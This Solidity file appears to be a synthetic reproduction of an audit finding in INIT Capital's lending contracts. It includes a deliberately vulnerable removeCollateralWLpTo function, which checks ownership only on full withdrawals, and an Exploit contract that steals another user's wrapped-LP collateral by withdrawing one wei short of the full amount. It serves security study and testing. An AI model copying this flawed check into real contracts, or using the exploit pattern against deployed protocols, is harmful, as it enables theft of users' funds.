// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*//////////////////////////////////////////////////////////////////////////
    INIT Capital — [H-02] wLp tokens could be stolen
    (code4rena 2023-12-initcapital, reporter sashik_eth, finding #29590)

    SYNTHETIC, CHEATCODE-FREE reduction for the EVM Playground. The vulnerable
    PosManager.removeCollateralWLpTo body is inlined VERBATIM in spirit (the
    missing "does `_tokenId` belong to `_posId`" check is only performed in
    the `newWLpAmt == 0` branch — exactly as in the real contract, marked
    "@> VULN" below); the Exploit reproduces the finding's own PoC exactly:
    Bob deposits a wLp as collateral, Alice deposits dust into her OWN
    position, then Alice calls removeCollateralWLpTo on HER OWN posId but
    Bob's tokenId with an amount 1 wei short of the full balance so the
    ownership-check branch never runs — draining almost all of Bob's
    collateral to herself (no fork, no cheatcodes).

    Root cause: `removeCollateralWLpTo(_posId, _wLp, _tokenId, _amt, _receiver)`
    is only reachable via the (permissioned) core contract, but it identifies
    WHICH position's collateral to debit purely from the `_wLp`/`_tokenId`
    pair's OWN internal remaining-balance accounting -- it checks that
    `_posId` actually holds `_tokenId` ONLY when the withdrawal empties the
    wLp completely (`newWLpAmt == 0`). Any PARTIAL withdrawal (1 wei short of
    full) skips that check entirely, so a caller can name ANY `_posId` they
    control and ANY OTHER position's `_tokenId`/`_wLp` and unwrap almost all
    of it to themselves.
//////////////////////////////////////////////////////////////////////////*/

/// @dev Minimal ERC20 used as the underlying LP token that the wLp wraps.
contract MockToken {
    mapping(address => uint256) public balanceOf;

    function mint(address to, uint256 amt) external {
        balanceOf[to] += amt;
    }

    function transfer(address to, uint256 amt) external returns (bool) {
        balanceOf[msg.sender] -= amt;
        balanceOf[to] += amt;
        return true;
    }
}

/// @notice Minimal wrapped-LP (IBaseWrapLp-shaped): each NFT-like `tokenId`
///         wraps a claim on `balanceOfLp[tokenId]` units of the underlying LP
///         token, all currently held (deposited) by `owner` (the PosManager).
contract MockWrapLp {
    address public immutable owner; // PosManager — holds every deposited wLp
    MockToken public immutable lpToken;
    mapping(uint256 => uint256) public balanceOfLp;

    constructor(address _owner, MockToken _lpToken) {
        owner = _owner;
        lpToken = _lpToken;
    }

    /// @dev Every deposited wLp NFT is held by the PosManager (simplification —
    ///      real IBaseWrapLp is a full ERC721; only `ownerOf` is needed here).
    function ownerOf(uint256) external view returns (address) {
        return owner;
    }

    /// @dev Mints `amt` of backing LP into this wLp under `_id` (simulates a
    ///      real deposit-and-wrap step, which is out of scope for this bug).
    function mintTo(uint256 _id, uint256 amt) external {
        balanceOfLp[_id] += amt;
        lpToken.mint(address(this), amt);
    }

    /// @dev unwrap: pay out `_amt` of the underlying LP token for wLp `_id`.
    function unwrap(uint256 _id, uint256 _amt, address _to) external returns (bytes memory) {
        balanceOfLp[_id] -= _amt;
        lpToken.transfer(_to, _amt);
        return "";
    }

    /// @dev no rewards in this reduction — always empty.
    function harvest(uint256, address) external pure returns (address[] memory tokens, uint256[] memory amts) {
        tokens = new address[](0);
        amts = new uint256[](0);
    }
}

/// @notice Reduced INIT Capital PosManager holding ONLY the collateral-wLp
///         bookkeeping relevant to the bug (PosManager.sol#L213-268).
contract PosManagerVuln {
    struct PosCollInfo {
        uint8 collCount;
        mapping(address => mapping(uint256 => bool)) hasId; // wLp => tokenId => this position holds it
    }

    mapping(uint256 => PosCollInfo) private __posCollInfos;
    mapping(address => mapping(uint256 => bool)) public isCollateralized; // wLp => tokenId => collateralized by ANY position

    /// @dev Reduced from PosManager.sol#addCollateralWLp (PosManager.sol#L213-227).
    function addCollateralWLp(uint256 _posId, address _wLp, uint256 _tokenId) external returns (uint256 amtIn) {
        require(MockWrapLp(_wLp).ownerOf(_tokenId) == address(this), "NOT_OWNER");
        require(!isCollateralized[_wLp][_tokenId], "ALREADY_COLLATERALIZED");
        require(MockWrapLp(_wLp).balanceOfLp(_tokenId) != 0, "ZERO_VALUE");
        PosCollInfo storage posCollInfo = __posCollInfos[_posId];
        if (!posCollInfo.hasId[_wLp][_tokenId]) {
            posCollInfo.hasId[_wLp][_tokenId] = true;
            posCollInfo.collCount += 1;
        }
        isCollateralized[_wLp][_tokenId] = true;
        amtIn = MockWrapLp(_wLp).balanceOfLp(_tokenId);
    }

    /// @dev Verbatim in spirit from PosManager.sol#removeCollateralWLpTo
    ///      (PosManager.sol#L249-268) — the ownership `contains` check
    ///      (`posCollInfo.ids[_wLp].remove(_tokenId)` in the real code, here
    ///      `hasId[_wLp][_tokenId]`) is inlined at the EXACT same place: only
    ///      inside the `newWLpAmt == 0` branch.
    function removeCollateralWLpTo(uint256 _posId, address _wLp, uint256 _tokenId, uint256 _amt, address _receiver)
        external
        returns (uint256)
    {
        PosCollInfo storage posCollInfo = __posCollInfos[_posId];
        // NOTE: balanceOfLp should be 1:1 with amt
        uint256 newWLpAmt = MockWrapLp(_wLp).balanceOfLp(_tokenId) - _amt;
        // @> VULN: this condition GATES the only place `_posId` is checked to
        // actually hold `_tokenId` (the require on the next line). It is only
        // true on a FULL withdrawal. Any partial withdrawal — 1 wei short of
        // the full balance is enough — makes this false, so the ownership
        // check inside is skipped entirely and `_posId` never has to be the
        // position that deposited `_tokenId` at all.
        if (newWLpAmt == 0) {
            require(posCollInfo.hasId[_wLp][_tokenId], "NOT_CONTAIN");
            posCollInfo.hasId[_wLp][_tokenId] = false;
            posCollInfo.collCount -= 1;
            isCollateralized[_wLp][_tokenId] = false;
        }
        // FIX (per finding): require(posCollInfo.hasId[_wLp][_tokenId], "NOT_CONTAIN"); unconditionally.
        MockWrapLp(_wLp).harvest(_tokenId, address(this));
        MockWrapLp(_wLp).unwrap(_tokenId, _amt, _receiver);
        return _amt;
    }
}

/// @notice Reproduces the finding's own `testExploitStealWlp` PoC: Bob
///         collateralizes a wLp; Alice, using only her OWN position id and a
///         dust deposit of her own, drains almost all of Bob's wLp.
contract Exploit {
    uint256 public constant BOB_POS_ID = 1;
    uint256 public constant ALICE_POS_ID = 2;
    uint256 public constant BOB_TOKEN_ID = 1;
    uint256 public constant ALICE_TOKEN_ID = 2;
    uint256 public constant VICTIM_AMT = 100_000_000;
    uint256 public constant ALICE_DUST = 1;

    address public constant BOB = address(0xB0B);
    address public constant ALICE = address(0xA11CE);

    MockToken public lpToken;
    MockWrapLp public wLp;
    PosManagerVuln public posManager;

    constructor() {
        lpToken = new MockToken();
        posManager = new PosManagerVuln();
        wLp = new MockWrapLp(address(posManager), lpToken);
    }

    function run() external {
        // Bob opens a position (tokenId 1) and collateralizes VICTIM_AMT of wLp.
        wLp.mintTo(BOB_TOKEN_ID, VICTIM_AMT);
        posManager.addCollateralWLp(BOB_POS_ID, address(wLp), BOB_TOKEN_ID);

        // Alice opens her OWN position (tokenId 2) with only a dust deposit.
        wLp.mintTo(ALICE_TOKEN_ID, ALICE_DUST);
        posManager.addCollateralWLp(ALICE_POS_ID, address(wLp), ALICE_TOKEN_ID);

        // Alice calls removeCollateralWLpTo on HER OWN posId, but names BOB's
        // tokenId, withdrawing VICTIM_AMT - 1 (1 wei short of full) so the
        // ownership check branch (newWLpAmt == 0) never executes.
        posManager.removeCollateralWLpTo(ALICE_POS_ID, address(wLp), BOB_TOKEN_ID, VICTIM_AMT - 1, ALICE);

        // HARM: Alice, who never deposited Bob's wLp and holds no claim on it,
        // now holds almost all of Bob's collateral — stolen from a position
        // she never touched, controlled, or was authorized over.
        require(lpToken.balanceOf(ALICE) == VICTIM_AMT - 1, "theft not demonstrated");
    }
}
